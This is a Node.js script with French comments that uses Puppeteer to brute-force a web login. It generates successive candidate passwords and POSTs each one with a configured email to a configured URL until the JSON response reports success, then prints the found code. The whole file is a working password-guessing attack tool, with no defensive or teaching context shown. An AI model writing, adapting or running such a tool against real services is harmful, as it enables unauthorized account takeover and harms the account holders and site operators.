const puppeteer = require('puppeteer');
const WordGenerator = require('./wordGenerator');
const config = require('../config');

var browser, word;

const maxthreads = 1000;
var threads = 0;
var stop = false;

module.exports = async function start(min =1, max =20, startWord =WordGenerator.plage[0].repeat(min)){
  browser = await puppeteer.launch();
  word = startWord;

  try {
    const bonCode = await loop(max);
    if(!bonCode) console.log(`Code non trouvé`);
    else console.log(`Code trouvé : ${bonCode}`);
   } catch(e) {
    console.log('Error happend while connecting to the URL: ', e.message)
   }

  await browser.close();
}

// Boucle sur l'appel de la fonction getNextWord, tout en respectant le nombre maximum de Threads
async function loop(max =20){
	if(stop) return;

	while(threads < maxthreads && word.length <= max){
		word = WordGenerator.getNextWord(word);
		threads++;
    var result = await tryWord(word);
    console.log(`${word} : ${result}`);
    if ( result ) return word
    threads--;
	}
  return false;
}


// Essayer de se connecter sur une URL a partir d'un mot : word 
async function tryWord(word){
  const page = await browser.newPage();
  await page.setRequestInterception(true);

  page.on('request', interceptedRequest => {
    interceptedRequest.continue({
      'method': 'POST',
      'postData': `email=${config.EMAIL}&password=${word}`
    });
  });
  const response = await page.goto(config.URL);
  const responseBody = await response.text();

  await page.close();
  return JSON.parse(responseBody).success;
}